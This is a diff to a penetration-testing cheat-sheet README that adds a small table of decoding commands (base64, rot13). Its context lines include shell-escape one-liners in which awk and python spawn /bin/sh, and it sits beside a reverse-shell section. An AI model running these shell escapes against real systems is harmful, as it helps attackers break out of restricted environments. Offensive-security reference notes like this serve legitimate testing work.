@@ -11,6 +11,13 @@ The [penetration test][0] tool set.
 | awk    | awk 'BEGIN {system("/bin/sh")}'             |
 | python | python -c 'import os; os.system("/bin/sh")' |
 
+### cryptography ###
+
+| type   | command                    | description                 |
+|--------|----------------------------|-----------------------------|
+| base64 | base64 -d                  | decode the Base 64 encoding |
+| rot13  | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rot13                       |
+
 ### reversed shell ###
 
 shell
